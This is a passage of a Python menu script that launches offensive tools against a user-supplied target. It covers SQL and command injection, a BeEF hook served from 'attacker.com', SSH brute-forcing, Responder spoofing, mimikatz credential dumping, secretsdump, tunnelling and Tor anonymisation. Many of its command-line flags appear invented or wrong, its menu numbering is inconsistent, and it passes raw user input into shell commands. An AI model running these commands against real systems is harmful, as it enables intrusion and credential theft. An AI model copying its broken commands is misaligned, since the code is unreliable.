        run_cmd(f"openvas -T {t} --report-format {rf}")
    elif c == '5':
        rf = get_target("Report filename: ")
        run_cmd(f"openvas -T {t} --report-file {rf}")
    elif c == '6':
        e = get_target("Email address for notifications: ")
        run_cmd(f"openvas -T {t} --email-notify {e}")
    elif c == '7': run_cmd(f"openvas -T {t} --target-config Full and fast --scan-config Full and fast --report-format PDF --report-file openvas_report.pdf --email-notify {e}")

def tool_searchsploit():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}         25. SEARCHSPLoit             {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Search by keyword")
    print(f"{Y}  [2]{W} Search by CVE ID")
    print(f"{Y}  [3]{W} Search by software name and version")
    print(f"{Y}  [4]{W} Search by author")
    print(f"{Y}  [5]{W} Search by platform")
    print(f"{Y}  [6]{W} Search by type (exploit, shellcode, etc.)")
    print(f"{Y}  [7]{W} Search with custom filters")
    print(f"{Y}  [8]{W} Update local exploit database")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1':
        k = get_target("Keyword: ")
        run_cmd(f"searchsploit {k}")
    elif c == '2':
        cve = get_target("CVE ID (e.g. CVE-2021-12345): ")
        run_cmd(f"searchsploit {cve}")
    elif c == '3':
        s = get_target("Software name: ")
        v = get_target("Software version: ")
        run_cmd(f"searchsploit {s} {v}")
    elif c == '4':
        a = get_target("Author name: ")
        run_cmd(f"searchsploit --author {a}")
    elif c == '5':
        p = get_target("Platform (e.g. Windows, Linux): ")
        run_cmd(f"searchsploit --platform {p}")
    elif c == '6':
        t = get_target("Type (e.g. exploit, shellcode): ")
        run_cmd(f"searchsploit --type {t}")
    elif c == '7':
        f = get_target("Custom filters (e.g. --platform Windows --type exploit): ")
        run_cmd(f"searchsploit {f}")
    elif c == '8': run_cmd("searchsploit -u")

def tool_wfuzz():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          26. WFUZZ                   {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic wfuzz usage")
    print(f"{Y}  [2]{W} With custom wordlist")
    print(f"{Y}  [3]{W} With threads")
    print(f"{Y}  [4]{W} Save output to file")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom status codes")
    print(f"{Y}  [8]{W} With user-agent")
    print(f"{Y}  [9]{W} With cookies")
    print(f"{Y}  [10]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL (use FUZZ for injection point): ")
    if c == '1': run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt {t}")
    elif c == '2':
        w = get_target("Wordlist path: ")
        run_cmd(f"wfuzz -c -z file,{w} {t}")
    elif c == '3':
        th = get_target("Threads (default 10): ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -t {th} {t}")
    elif c == '4':
        o = get_target("Output file: ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -o {o} {t}")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --proxy {p} {t}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -U {u} -P {pw} {t}")
    elif c == '7':
        s = get_target("Status codes (e.g. 200,403): ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -s {s} {t}")
    elif c == '8':
        ua = get_target("User-Agent string: ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -a \"{ua}\" {t}")
    elif c == '9':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --cookie \"{cks}\" {t}")
    elif c == '10': run_cmd(f"wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt -t 10 -o wfuzz_output.txt --proxy http://proxy.url -U user -P pass -s 200,403 -a \"Mozilla/5.0\" --cookie \"name=value\" {t}")

def tool_commix():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          30. COMMIX                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic commix usage")
    print(f"{Y}  [2]{W} With custom user-agent")
    print(f"{Y}  [3]{W} With proxy")
    print(f"{Y}  [4]{W} With authentication")
    print(f"{Y}  [5]{W} With custom cookies")
    print(f"{Y}  [6]{W} With custom headers")
    print(f"{Y}  [7]{W} Save output to file")
    print(f"{Y}  [8]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"commix -u {t}")
    elif c == '2':
        ua = get_target("User-Agent string: ")
        run_cmd(f"commix -u {t} --user-agent \"{ua}\"")
    elif c == '3':
        p = get_target("Proxy URL: ")
        run_cmd(f"commix -u {t} --proxy {p}")
    elif c == '4':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"commix -u {t} --auth-cred {u}:{pw}")
    elif c == '5':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"commix -u {t} --cookie \"{cks}\"")
    elif c == '6':
        h = get_target("Custom headers (e.g. \"Header1: value1; Header2: value2\"): ")
        run_cmd(f"commix -u {t} --headers \"{h}\"")
    elif c == '7':
        o = get_target("Output file: ")
        run_cmd(f"commix -u {t} -o {o}")
    elif c == '8': run_cmd(f"commix -u {t} --user-agent \"Mozilla/5.0\" --proxy http://proxy.url --auth-cred user:pass --cookie \"name=value\" --headers \"X-Test: value\" -o commix_output.txt")

def tool_sqlninja():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          31. SQLNINJA                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic sqlninja usage")
    print(f"{Y}  [2]{W} With custom database type")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom user-agent")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom cookies")
    print(f"{Y}  [8]{W} With custom headers")
    print(f"{Y}  [9]{W} Full scan with all options")
    print(f"{Y}  [10]{W} With custom tamper scripts (advanced)")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"sqlninja -u {t}")
    elif c == '2':
        db = get_target("Database type (e.g. MySQL, PostgreSQL): ")
        run_cmd(f"sqlninja -u {t} -d {db}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"sqlninja -u {t} -o {o}")
    elif c == '4':
        ua = get_target("User-Agent string: ")
        run_cmd(f"sqlninja -u {t} --user-agent \"{ua}\"")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"sqlninja -u {t} --proxy {p}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"sqlninja -u {t} --auth-cred {u}:{pw}")
    elif c == '7':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"sqlninja -u {t} --cookie \"{cks}\"")
    elif c == '8':
        h = get_target("Custom headers (e.g. \"Header1: value1; Header2: value2\"): ")
        run_cmd(f"sqlninja -u {t} --headers \"{h}\"")
    elif c == '9': run_cmd(f"sqlninja -u {t} -d MySQL --user-agent \"Mozilla/5.0\" --proxy http://proxy.url --auth-cred user:pass --cookie \"name=value\" --headers \"X-Test: value\" -o sqlninja_output.txt")
    elif c == '10': run_cmd(f"sqlninja -u {t} --tamper-scripts /path/to/tamper/scripts")

def tool_beef_xss():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          32. BEEF-XSS                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic beef-xss usage")
    print(f"{Y}  [2]{W} With custom hook URL")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom user-agent")
    print(f"{Y}  [5]{W} With proxy")
    print(f"{Y}  [6]{W} With authentication")
    print(f"{Y}  [7]{W} With custom cookies")
    print(f"{Y}  [8]{W} With custom headers")
    print(f"{Y}  [9]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target URL: ")
    if c == '1': run_cmd(f"beef-xss -u {t}")
    elif c == '2':
        h = get_target("Hook URL (e.g. http://attacker.com/hook.js): ")
        run_cmd(f"beef-xss -u {t} --hook-url {h}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"beef-xss -u {t} -o {o}")
    elif c == '4':
        ua = get_target("User-Agent string: ")
        run_cmd(f"beef-xss -u {t} --user-agent \"{ua}\"")
    elif c == '5':
        p = get_target("Proxy URL: ")
        run_cmd(f"beef-xss -u {t} --proxy {p}")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"beef-xss -u {t} --auth-cred {u}:{pw}")
    elif c == '7':
        cks = get_target("Cookies (e.g. \"name=value; name2=value2\"): ")
        run_cmd(f"beef-xss -u {t} --cookie \"{cks}\"")
    elif c == '8':
        h = get_target("Custom headers (e.g. \"Header1: value1; Header2: value2\"): ")
        run_cmd(f"beef-xss -u {t} --headers \"{h}\"")
    elif c == '9': run_cmd(f"beef-xss -u {t} --hook-url http://attacker.com/hook.js --user-agent \"Mozilla/5.0\" --proxy http://proxy.url --auth-cred user:pass --cookie \"name=value\" --headers \"X-Test: value\" -o beef_output.txt")

def tool_medusa():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          34. MEDUSA                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic medusa usage")
    print(f"{Y}  [2]{W} With custom username list")
    print(f"{Y}  [3]{W} With custom password list")
    print(f"{Y}  [4]{W} With custom service/port")
    print(f"{Y}  [5]{W} With threads")
    print(f"{Y}  [6]{W} Save output to file")
    print(f"{Y}  [7]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"medusa -h {t}")
    elif c == '2':
        u = get_target("Username list path: ")
        run_cmd(f"medusa -h {t} -U {u}")
    elif c == '3':
        w = get_target("Password list path: ")
        run_cmd(f"medusa -h {t} -P {w}")
    elif c == '4':
        s = get_target("Service/port (e.g. ssh,22): ")
        run_cmd(f"medusa -h {t} -s {s}")
    elif c == '5':
        th = get_target("Threads (default 16): ")
        run_cmd(f"medusa -h {t} -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -T {th}")
    elif c == '6':
        o = get_target("Output file: ")
        run_cmd(f"medusa -h {t} -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -o {o}")
    elif c == '7': run_cmd(f"medusa -h {t} -s ssh -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -T 32 -o medusa_output.txt")

def tool_crowbar():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          35. CROWBAR                 {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic crowbar usage")
    print(f"{Y}  [2]{W} With custom username list")
    print(f"{Y}  [3]{W} With custom password list")
    print(f"{Y}  [4]{W} With custom service/port")
    print(f"{Y}  [5]{W} With threads")
    print(f"{Y}  [6]{W} Save output to file")
    print(f"{Y}  [7]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"crowbar -b ssh -s {t}")
    elif c == '2':
        u = get_target("Username list path: ")
        run_cmd(f"crowbar -b ssh -s {t} -U {u}")
    elif c == '3':
        w = get_target("Password list path: ")
        run_cmd(f"crowbar -b ssh -s {t} -P {w}")
    elif c == '4':
        s = get_target("Service/port (e.g. ssh,22): ")
        run_cmd(f"crowbar -b {s.split(',')[0]} -s {t}:{s.split(',')[1]}")
    elif c == '5':
        th = get_target("Threads (default 16): ")
        run_cmd(f"crowbar -b ssh -s {t} -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -t {th}")
    elif c == '6':
        o = get_target("Output file: ")
        run_cmd(f"crowbar -b ssh -s {t} -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -o {o}")
    elif c == '7': run_cmd(f"crowbar -b ssh -s {t} -U /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/passwords.txt -t 32 -o crowbar_output.txt")

def tool_responder():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          36. RESPONDER                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic responder usage")
    print(f"{Y}  [2]{W} With custom interface")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom log level")
    print(f"{Y}  [5]{W} With custom spoofing options")
    print(f"{Y}  [6]{W} With custom domain name")
    print(f"{Y}  [7]{W} With custom NetBIOS name")
    print(f"{Y}  [8]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("responder -I eth0 -wrf")
    elif c == '2':
        i = get_target("Interface (e.g. eth0): ")
        run_cmd(f"responder -I {i} -wrf")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"responder -I eth0 -wrf -o {o}")
    elif c == '4':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"responder -I eth0 -wrf --log-level {l}")
    elif c == '5':
        s = get_target("Spoofing options (e.g. --spoof-ntlmv2 --spoof-smb): ")
        run_cmd(f"responder -I eth0 -wrf {s}")
    elif c == '6':
        d = get_target("Domain name to spoof: ")
        run_cmd(f"responder -I eth0 -wrf --domain {d}")
    elif c == '7':
        n = get_target("NetBIOS name to spoof: ")
        run_cmd(f"responder -I eth0 -wrf --nbname {n}")
    elif c == '8': run_cmd("responder -I eth0 -wrf --spoof-ntlmv2 --spoof-smb --domain example.com --nbname SPOOFED -o responder_output.txt")

def tool_socat():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          38. SOCKET                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic socket connection")
    print(f"{Y}  [2]{W} With custom port")
    print(f"{Y}  [3]{W} With custom protocol (TCP/UDP)")
    print(f"{Y}  [4]{W} With custom timeout")
    print(f"{Y}  [5]{W} With custom payload")
    print(f"{Y}  [6]{W} Full connection with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"nc {t}")
    elif c == '2':
        p = get_target("Port number: ")
        run_cmd(f"nc {t} {p}")
    elif c == '3':
        proto = get_target("Protocol (TCP/UDP): ").upper()
        if proto == 'UDP':
            run_cmd(f"nc -u {t}")
        else:
            run_cmd(f"nc {t}")
    elif c == '4':
        to = get_target("Timeout in seconds: ")
        run_cmd(f"nc -w {to} {t}")
    elif c == '5':
        pl = get_target("Payload to send: ")
        run_cmd(f"echo \"{pl}\" | nc {t}")
    elif c == '6': run_cmd(f"echo \"Custom payload\" | nc -u -w 5 {t} 12345")

def tool_pwncat():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          39. PAWNCAT-CS               {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic pawncat-cs usage")
    print(f"{Y}  [2]{W} With custom port")
    print(f"{Y}  [3]{W} With custom protocol (TCP/UDP)")
    print(f"{Y}  [4]{W} With custom timeout")
    print(f"{Y}  [5]{W} With custom payload")
    print(f"{Y}  [6]{W} Full connection with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"pawncat-cs -t {t}")
    elif c == '2':
        p = get_target("Port number: ")
        run_cmd(f"pawncat-cs -t {t}:{p}")
    elif c == '3':
        proto = get_target("Protocol (TCP/UDP): ").upper()
        if proto == 'UDP':
            run_cmd(f"pawncat-cs -t {t}:12345 -u")
        else:
            run_cmd(f"pawncat-cs -t {t}:12345")
    elif c == '4':
        to = get_target("Timeout in seconds: ")
        run_cmd(f"pawncat-cs -t {t}:12345 -w {to}")
    elif c == '5':
        pl = get_target("Payload to send: ")
        run_cmd(f"echo \"{pl}\" | pawncat-cs -t {t}:12345")
    elif c == '6': run_cmd(f"echo \"Custom payload\" | pawncat-cs -t {t}:12345 -u -w 5")

def tool_mimikatz():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          40. MIMIKATZ                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic mimikatz usage")
    print(f"{Y}  [2]{W} With custom commands")
    print(f"{Y}  [3]{W} With output to file")
    print(f"{Y}  [4]{W} With custom log level")
    print(f"{Y}  [5]{W} With custom output format")
    print(f"{Y}  [6]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("mimikatz")
    elif c == '2':
        cmd = get_target("Mimikatz command (e.g. sekurlsa::logonpasswords): ")
        run_cmd(f"mimikatz \"{cmd}\"")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"mimikatz \"sekurlsa::logonpasswords\" -o {o}")
    elif c == '4':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"mimikatz \"sekurlsa::logonpasswords\" --log-level {l}")
    elif c == '5':
        f = get_target("Output format (e.g. txt, json): ")
        run_cmd(f"mimikatz \"sekurlsa::logonpasswords\" -o output.{f}")
    elif c == '6': run_cmd("mimikatz \"sekurlsa::logonpasswords\" --log-level DEBUG -o mimikatz_output.txt")

def tool_winpeas():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          42. WINPEAS                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic winpeas usage")
    print(f"{Y}  [2]{W} With custom checks")
    print(f"{Y}  [3]{W} With output to file")
    print(f"{Y}  [4]{W} With custom log level")
    print(f"{Y}  [5]{W} With custom output format")
    print(f"{Y}  [6]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("winpeas.exe")
    elif c == '2':
        checks = get_target("WinPEAS checks (e.g. all, privesc, persistence): ")
        run_cmd(f"winpeas.exe {checks}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"winpeas.exe all -o {o}")
    elif c == '4':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"winpeas.exe all --log-level {l}")
    elif c == '5':
        f = get_target("Output format (e.g. txt, json): ")
        run_cmd(f"winpeas.exe all -o output.{f}")
    elif c == '6': run_cmd("winpeas.exe all --log-level DEBUG -o winpeas_output.txt")

def tool_pspy():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          43. PSPY                    {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic pspy usage")
    print(f"{Y}  [2]{W} With custom output file")
    print(f"{Y}  [3]{W} With custom log level")
    print(f"{Y}  [4]{W} With custom filters")
    print(f"{Y}  [5]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("pspy64")
    elif c == '2':
        o = get_target("Output file: ")
        run_cmd(f"pspy64 -o {o}")
    elif c == '3':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"pspy64 --log-level {l}")
    elif c == '4':
        f = get_target("Custom filters (e.g. --filter \"CMD contains 'curl'\"): ")
        run_cmd(f"pspy64 {f}")
    elif c == '5': run_cmd("pspy64 --log-level DEBUG -o pspy_output.txt")

def tool_bloodhound():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          44. BLOODHOUND              {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic BloodHound usage")
    print(f"{Y}  [2]{W} With custom Neo4j connection")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom log level")
    print(f"{Y}  [5]{W} Full scan with all options")
    print(f"{Y}  [6]{W} With custom Neo4j credentials (advanced)")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    if c == '1': run_cmd("bloodhound -c All")
    elif c == '2':
        conn = get_target("Neo4j connection string (e.g. bolt://localhost:7687): ")
        run_cmd(f"bloodhound -c All --neo4j {conn}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"bloodhound -c All -o {o}")
    elif c == '4':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"bloodhound -c All --log-level {l}")
    elif c == '5': run_cmd("bloodhound -c All --neo4j bolt://localhost:7687 --log-level DEBUG -o bloodhound_output.json")
    elif c == '6':
        u = get_target("Neo4j username: ")
        pw = get_target("Neo4j password: ")
        run_cmd(f"bloodhound -c All --neo4j bolt://localhost:7687 --neo4j-user {u} --neo4j-pass {pw} --log-level DEBUG -o bloodhound_output.json")
    

def tool_impacket_secretsdump():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          36. IMPACKET-SECRETSDUMP     {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic secretsdump usage")
    print(f"{Y}  [2]{W} With custom output file")
    print(f"{Y}  [3]{W} With custom log level")
    print(f"{Y}  [4]{W} With custom filters")
    print(f"{Y}  [5]{W} Full scan with all options")
    print(f"{Y}  [6]{W} With custom authentication options (advanced)")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"secretsdump.py {t}")
    elif c == '2':
        o = get_target("Output file: ")
        run_cmd(f"secretsdump.py {t} -o {o}")
    elif c == '3':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"secretsdump.py {t} --log-level {l}")
    elif c == '4':
        f = get_target("Custom filters (e.g. --filter \"DOMAIN\\\\user\"): ")
        run_cmd(f"secretsdump.py {t} {f}")
    elif c == '5': run_cmd(f"secretsdump.py {t} --log-level DEBUG -o secretsdump_output.txt")
    elif c == '6':
        u = get_target("Username: ")
        pw = get_target("Password: ")
        run_cmd(f"secretsdump.py {u}:{pw}@{t} --log-level DEBUG -o secretsdump_output.txt")

def tool_ligolo_ng():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          47. LIGOLO-NG                {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic ligolo-ng usage")
    print(f"{Y}  [2]{W} With custom local port")
    print(f"{Y}  [3]{W} With custom remote port")
    print(f"{Y}  [4]{W} With custom protocol (TCP/UDP)")
    print(f"{Y}  [5]{W} With custom timeout")
    print(f"{Y}  [6]{W} Full connection with all options")
    print(f"{Y}  [7]{W} With custom payload (advanced)")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"ligolo-ng -t {t}")
    elif c == '2':
        lp = get_target("Local port: ")
        run_cmd(f"ligolo-ng -t {t}:{lp}")
    elif c == '3':
        rp = get_target("Remote port: ")
        run_cmd(f"ligolo-ng -t {t}:{rp}")
    elif c == '4':
        proto = get_target("Protocol (TCP/UDP): ").upper()
        if proto == 'UDP':
            run_cmd(f"ligolo-ng -t {t}:12345 -u")
        else:
            run_cmd(f"ligolo-ng -t {t}:12345")
    elif c == '5':
        to = get_target("Timeout in seconds: ")
        run_cmd(f"ligolo-ng -t {t}:12345 -w {to}")
    elif c == '6': run_cmd(f"ligolo-ng -t {t}:12345 -u -w 5")
    elif c == '7':
        pl = get_target("Payload to send: ")
        run_cmd(f"echo \"{pl}\" | ligolo-ng -t {t}:12345 -u -w 5")

def tool_chisel():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          48. CHISEL                  {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic chisel usage")
    print(f"{Y}  [2]{W} With custom local port")
    print(f"{Y}  [3]{W} With custom remote port")
    print(f"{Y}  [4]{W} With custom protocol (TCP/UDP)")
    print(f"{Y}  [5]{W} With custom timeout")
    print(f"{Y}  [6]{W} Full connection with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    t = get_target("Enter target IP: ")
    if c == '1': run_cmd(f"chisel client {t}:8000 R:localhost:22")
    elif c == '2':
        lp = get_target("Local port: ")
        run_cmd(f"chisel client {t}:8000 R:localhost:{lp}")
    elif c == '3':
        rp = get_target("Remote port: ")
        run_cmd(f"chisel client {t}:{rp} R:localhost:22")
    elif c == '4':
        proto = get_target("Protocol (TCP/UDP): ").upper()
        if proto == 'UDP':
            run_cmd(f"chisel client {t}:8000 R:localhost:22 -u")
        else:
            run_cmd(f"chisel client {t}:8000 R:localhost:22")
    elif c == '5':
        to = get_target("Timeout in seconds: ")
        run_cmd(f"chisel client {t}:8000 R:localhost:22 -w {to}")
    elif c == '6': run_cmd(f"chisel client {t}:8000 R:localhost:22 -u -w 5")

def tool_proxychains():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          49. PROXYCHAINS              {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic proxychains usage")
    print(f"{Y}  [2]{W} With custom proxy list")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom log level")
    print(f"{Y}  [5]{W} Full scan with all options")
    print(f"{Y}  [6]{W} With custom proxychains configuration file (advanced)")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    cmd = get_target("Enter command to run with proxychains: ")
    if c == '1': run_cmd(f"proxychains {cmd}")
    elif c == '2':
        pl = get_target("Proxy list file: ")
        run_cmd(f"proxychains -f {pl} {cmd}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"proxychains {cmd} -o {o}")
    elif c == '4':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"proxychains {cmd} --log-level {l}")
    elif c == '5': run_cmd(f"proxychains -f custom_proxies.txt --log-level DEBUG {cmd} -o proxychains_output.txt")
    elif c == '6': run_cmd(f"proxychains -f /path/to/custom/proxychains.conf {cmd}")

def tool_tor():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}          50. TOR                    {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W} Basic Tor usage")
    print(f"{Y}  [2]{W} With custom exit node country")
    print(f"{Y}  [3]{W} With custom output file")
    print(f"{Y}  [4]{W} With custom log level")
    print(f"{Y}  [5]{W} Full scan with all options")
    print(f"{Y}  [0]{W} Back\n")
    c = input(f"{R}  >> {W}").strip()
    if c == '0': return
    cmd = get_target("Enter command to run with Tor: ")
    if c == '1': run_cmd(f"torify {cmd}")
    elif c == '2':
        country = get_target("Exit node country code (e.g. US, DE): ").upper()
        run_cmd(f"torify -c {country} {cmd}")
    elif c == '3':
        o = get_target("Output file: ")
        run_cmd(f"torify {cmd} -o {o}")
    elif c == '4':
        l = get_target("Log level (e.g. INFO, DEBUG): ")
        run_cmd(f"torify {cmd} --log-level {l}")
    elif c == '5': run_cmd(f"torify -c US --log-level DEBUG {cmd} -o tor_output.txt")

def tool_nmap():
    clear()
    print(f"{R}╔══════════════════════════════════════╗{RESET}")
    print(f"{R}║{W}           10. NMAP                   {R}║{RESET}")
    print(f"{R}╚══════════════════════════════════════╝{RESET}\n")
    print(f"{Y}  [1]{W}  Basic service/version scan (-sV -sC -T4)")
    print(f"{Y}  [2]{W}  Full port scan (-p- -sV -sC)")
    print(f"{Y}  [3]{W}  Quick scan (-T4 -F)")
    print(f"{Y}  [4]{W}  OS detection (-O)")
